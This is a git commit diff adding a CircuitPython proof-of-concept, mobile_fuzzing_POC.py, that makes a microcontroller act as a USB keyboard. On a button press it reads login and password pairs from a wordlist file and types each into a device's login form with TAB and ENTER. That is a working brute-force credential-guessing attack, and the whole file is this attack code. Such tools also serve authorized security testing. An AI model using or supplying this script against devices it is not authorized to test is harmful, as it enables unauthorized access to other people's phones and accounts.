9897a80a37db723e327e0bdde5420076ba4b9915
Rômulo Fernandes Evangelista <romulo.fernandes@bridge.ufsc.br>
2023-10-28 17:50:31 -0300

    POC ready

--- mobile_fuzzing_POC.py
+++ mobile_fuzzing_POC.py
@@ -1,13 +1,45 @@
+### LIBRARIES ###
 import usb_hid
+import board
+import time
+import digitalio
 
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keycode import Keycode
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 
+### VARIABLES ###
+button = digitalio.DigitalInOut(board.GP9)
+led = digitalio.DigitalInOut(board.GP8)
+led.direction = digitalio.Direction.OUTPUT
+button.switch_to_input(pull = digitalio.Pull.UP)
+filePath = "./wordlist.txt"
 kbd = Keyboard(usb_hid.devices)
 layout = KeyboardLayoutUS(kbd)
 
-layout.write('admin')
+### FUNCTIONS ###
+def typeCredentials(login, password):
+  layout.write(login)
+  kbd.send(Keycode.TAB)
+  layout.write(password)
+  kbd.send(Keycode.TAB)
+  kbd.send(Keycode.ENTER)
+  time.sleep(1)
+  kbd.send(Keycode.ENTER)
 
-kbd.send(Keycode.ENTER)
-layout.write('admin')
+### MAIN LOOOP ###
+while True:
+  if button.value == False: # If the button is pressed
+    try:
+      with open(filePath, "r") as file:
+        for line in file:
+          led.value = True
+          words = line.strip().split(',')
+          login = words[0]
+          password = words[1]
+          typeCredentials(login, password)
+          time.sleep(1)
+          led.value = False
+    except: print("[-] Error")
+  else:   
+    print("[+] Button is not pressed")
